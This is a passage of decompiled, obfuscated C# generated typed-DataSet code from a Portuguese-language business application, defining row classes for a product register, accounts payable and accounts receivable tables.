			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public int QUANTIDADE_COMPRA
			{
				get
				{
					try
					{
						return Conversions.ToInteger(base[tableTB_CADPROD.QUANTIDADE_COMPRAColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(7738), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.QUANTIDADE_COMPRAColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string CATEGORIA
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADPROD.CATEGORIAColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(7882), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.CATEGORIAColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public int ESTOQUE_ATUAL
			{
				get
				{
					try
					{
						return Conversions.ToInteger(base[tableTB_CADPROD.ESTOQUE_ATUALColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(8010), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.ESTOQUE_ATUALColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DateTime DAT_VALIDADE
			{
				get
				{
					try
					{
						return Conversions.ToDate(base[tableTB_CADPROD.DAT_VALIDADEColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(8146), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.DAT_VALIDADEColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public decimal PRECO_CUSTO
			{
				get
				{
					try
					{
						return Conversions.ToDecimal(base[tableTB_CADPROD.PRECO_CUSTOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(8280), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.PRECO_CUSTOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public decimal PRECO_PRODUTO
			{
				get
				{
					try
					{
						return Conversions.ToDecimal(base[tableTB_CADPROD.PRECO_PRODUTOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(8412), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.PRECO_PRODUTOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DateTime DAT_ULT_COMPRA
			{
				get
				{
					try
					{
						return Conversions.ToDate(base[tableTB_CADPROD.DAT_ULT_COMPRAColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(8548), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.DAT_ULT_COMPRAColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string OBSERVACAO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADPROD.OBSERVACAOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(8686), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.OBSERVACAOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string NOME_FORNECEDOR
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADPROD.NOME_FORNECEDORColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(8816), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.NOME_FORNECEDORColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string FONE_FORNECEDOR
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADPROD.FONE_FORNECEDORColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(8956), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.FONE_FORNECEDORColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public int MARGEM_LUCRO
			{
				get
				{
					try
					{
						return Conversions.ToInteger(base[tableTB_CADPROD.MARGEM_LUCROColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(9096), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.MARGEM_LUCROColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string EMAIL
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADPROD.EMAILColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(9230), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.EMAILColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string SITE
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADPROD.SITEColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(9350), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.SITEColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string FACEBOOK
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADPROD.FACEBOOKColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(9468), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.FACEBOOKColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			internal TB_CADPRODRow(DataRowBuilder rb)
			{
				\u0008.\u0002.\u0001();
				base..ctor(rb);
				tableTB_CADPROD = (TB_CADPRODDataTable)base.Table;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsDESCRICAONull()
			{
				return IsNull(tableTB_CADPROD.DESCRICAOColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetDESCRICAONull()
			{
				base[tableTB_CADPROD.DESCRICAOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsCOD_BARRASNull()
			{
				return IsNull(tableTB_CADPROD.COD_BARRASColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetCOD_BARRASNull()
			{
				base[tableTB_CADPROD.COD_BARRASColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsQUANTIDADE_COMPRANull()
			{
				return IsNull(tableTB_CADPROD.QUANTIDADE_COMPRAColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetQUANTIDADE_COMPRANull()
			{
				base[tableTB_CADPROD.QUANTIDADE_COMPRAColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsCATEGORIANull()
			{
				return IsNull(tableTB_CADPROD.CATEGORIAColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetCATEGORIANull()
			{
				base[tableTB_CADPROD.CATEGORIAColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsESTOQUE_ATUALNull()
			{
				return IsNull(tableTB_CADPROD.ESTOQUE_ATUALColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetESTOQUE_ATUALNull()
			{
				base[tableTB_CADPROD.ESTOQUE_ATUALColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsDAT_VALIDADENull()
			{
				return IsNull(tableTB_CADPROD.DAT_VALIDADEColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetDAT_VALIDADENull()
			{
				base[tableTB_CADPROD.DAT_VALIDADEColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsPRECO_CUSTONull()
			{
				return IsNull(tableTB_CADPROD.PRECO_CUSTOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetPRECO_CUSTONull()
			{
				base[tableTB_CADPROD.PRECO_CUSTOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsPRECO_PRODUTONull()
			{
				return IsNull(tableTB_CADPROD.PRECO_PRODUTOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetPRECO_PRODUTONull()
			{
				base[tableTB_CADPROD.PRECO_PRODUTOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsDAT_ULT_COMPRANull()
			{
				return IsNull(tableTB_CADPROD.DAT_ULT_COMPRAColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetDAT_ULT_COMPRANull()
			{
				base[tableTB_CADPROD.DAT_ULT_COMPRAColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsOBSERVACAONull()
			{
				return IsNull(tableTB_CADPROD.OBSERVACAOColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetOBSERVACAONull()
			{
				base[tableTB_CADPROD.OBSERVACAOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsNOME_FORNECEDORNull()
			{
				return IsNull(tableTB_CADPROD.NOME_FORNECEDORColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetNOME_FORNECEDORNull()
			{
				base[tableTB_CADPROD.NOME_FORNECEDORColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsFONE_FORNECEDORNull()
			{
				return IsNull(tableTB_CADPROD.FONE_FORNECEDORColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetFONE_FORNECEDORNull()
			{
				base[tableTB_CADPROD.FONE_FORNECEDORColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsMARGEM_LUCRONull()
			{
				return IsNull(tableTB_CADPROD.MARGEM_LUCROColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetMARGEM_LUCRONull()
			{
				base[tableTB_CADPROD.MARGEM_LUCROColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsEMAILNull()
			{
				return IsNull(tableTB_CADPROD.EMAILColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetEMAILNull()
			{
				base[tableTB_CADPROD.EMAILColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsSITENull()
			{
				return IsNull(tableTB_CADPROD.SITEColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetSITENull()
			{
				base[tableTB_CADPROD.SITEColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsFACEBOOKNull()
			{
				return IsNull(tableTB_CADPROD.FACEBOOKColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetFACEBOOKNull()
			{
				base[tableTB_CADPROD.FACEBOOKColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}
		}

		public class TB_CONTASPAGARRow : DataRow
		{
			private TB_CONTASPAGARDataTable tableTB_CONTASPAGAR;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public int Código
			{
				get
				{
					return Conversions.ToInteger(base[tableTB_CONTASPAGAR.CódigoColumn]);
				}
				set
				{
					base[tableTB_CONTASPAGAR.CódigoColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DateTime DATA
			{
				get
				{
					try
					{
						return Conversions.ToDate(base[tableTB_CONTASPAGAR.DATAColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(9594), ex);
					}
				}
				set
				{
					base[tableTB_CONTASPAGAR.DATAColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string DESCRICAO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CONTASPAGAR.DESCRICAOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(9720), ex);
					}
				}
				set
				{
					base[tableTB_CONTASPAGAR.DESCRICAOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string PAGAR_PARA
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CONTASPAGAR.PAGAR_PARAColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(9856), ex);
					}
				}
				set
				{
					base[tableTB_CONTASPAGAR.PAGAR_PARAColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public double VALOR
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_CONTASPAGAR.VALORColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(9994), ex);
					}
				}
				set
				{
					base[tableTB_CONTASPAGAR.VALORColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string OBSERVACAO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CONTASPAGAR.OBSERVACAOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(10122), ex);
					}
				}
				set
				{
					base[tableTB_CONTASPAGAR.OBSERVACAOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string BANCO_AGENCIA
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CONTASPAGAR.BANCO_AGENCIAColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(10260), ex);
					}
				}
				set
				{
					base[tableTB_CONTASPAGAR.BANCO_AGENCIAColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string CHEQUE
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CONTASPAGAR.CHEQUEColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(10404), ex);
					}
				}
				set
				{
					base[tableTB_CONTASPAGAR.CHEQUEColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public int REPETIR
			{
				get
				{
					try
					{
						return Conversions.ToInteger(base[tableTB_CONTASPAGAR.REPETIRColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(10534), ex);
					}
				}
				set
				{
					base[tableTB_CONTASPAGAR.REPETIRColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string SITUACAO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CONTASPAGAR.SITUACAOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(10666), ex);
					}
				}
				set
				{
					base[tableTB_CONTASPAGAR.SITUACAOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			internal TB_CONTASPAGARRow(DataRowBuilder rb)
			{
				\u0008.\u0002.\u0001();
				base..ctor(rb);
				tableTB_CONTASPAGAR = (TB_CONTASPAGARDataTable)base.Table;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsDATANull()
			{
				return IsNull(tableTB_CONTASPAGAR.DATAColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetDATANull()
			{
				base[tableTB_CONTASPAGAR.DATAColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsDESCRICAONull()
			{
				return IsNull(tableTB_CONTASPAGAR.DESCRICAOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetDESCRICAONull()
			{
				base[tableTB_CONTASPAGAR.DESCRICAOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsPAGAR_PARANull()
			{
				return IsNull(tableTB_CONTASPAGAR.PAGAR_PARAColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetPAGAR_PARANull()
			{
				base[tableTB_CONTASPAGAR.PAGAR_PARAColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsVALORNull()
			{
				return IsNull(tableTB_CONTASPAGAR.VALORColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetVALORNull()
			{
				base[tableTB_CONTASPAGAR.VALORColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsOBSERVACAONull()
			{
				return IsNull(tableTB_CONTASPAGAR.OBSERVACAOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetOBSERVACAONull()
			{
				base[tableTB_CONTASPAGAR.OBSERVACAOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsBANCO_AGENCIANull()
			{
				return IsNull(tableTB_CONTASPAGAR.BANCO_AGENCIAColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetBANCO_AGENCIANull()
			{
				base[tableTB_CONTASPAGAR.BANCO_AGENCIAColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsCHEQUENull()
			{
				return IsNull(tableTB_CONTASPAGAR.CHEQUEColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetCHEQUENull()
			{
				base[tableTB_CONTASPAGAR.CHEQUEColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsREPETIRNull()
			{
				return IsNull(tableTB_CONTASPAGAR.REPETIRColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetREPETIRNull()
			{
				base[tableTB_CONTASPAGAR.REPETIRColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsSITUACAONull()
			{
				return IsNull(tableTB_CONTASPAGAR.SITUACAOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetSITUACAONull()
			{
				base[tableTB_CONTASPAGAR.SITUACAOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}
		}

		public class TB_CONTASRECEBERRow : DataRow
		{
			private TB_CONTASRECEBERDataTable tableTB_CONTASRECEBER;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public int Código
			{
				get
				{
					return Conversions.ToInteger(base[tableTB_CONTASRECEBER.CódigoColumn]);
				}
				set
				{
					base[tableTB_CONTASRECEBER.CódigoColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DateTime DATA_VENDA
			{
				get
				{
					try
					{
						return Conversions.ToDate(base[tableTB_CONTASRECEBER.DATA_VENDAColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(10800), ex);
					}
				}
				set
				{
					base[tableTB_CONTASRECEBER.DATA_VENDAColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string DESCRICAO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CONTASRECEBER.DESCRICAOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(10942), ex);
					}
				}
				set
				{
					base[tableTB_CONTASRECEBER.DESCRICAOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string NOME
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CONTASRECEBER.NOMEColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(11082), ex);
					}
				}
				set
				{
					base[tableTB_CONTASRECEBER.NOMEColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public double VALOR
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_CONTASRECEBER.VALORColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(11212), ex);
					}
				}
				set
				{
					base[tableTB_CONTASRECEBER.VALORColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string OBSERVACAO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CONTASRECEBER.OBSERVACAOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(11344), ex);
					}
				}
				set
				{
					base[tableTB_CONTASRECEBER.OBSERVACAOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string SITUACAO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CONTASRECEBER.SITUACAOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(11486), ex);
					}
				}
				set
				{
					base[tableTB_CONTASRECEBER.SITUACAOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string TEL_CEL
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CONTASRECEBER.TEL_CELColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(11624), ex);
					}
				}
				set
				{
					base[tableTB_CONTASRECEBER.TEL_CELColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string TEL_RES
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CONTASRECEBER.TEL_RESColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(11760), ex);
					}
				}
				set
				{
					base[tableTB_CONTASRECEBER.TEL_RESColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DateTime DATA_VENCIMENTO
			{
				get
				{
					try
					{
						return Conversions.ToDate(base[tableTB_CONTASRECEBER.DATA_VENCIMENTOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(11896), ex);
					}
				}
				set
				{
					base[tableTB_CONTASRECEBER.DATA_VENCIMENTOColumn] = value;
				}
			}

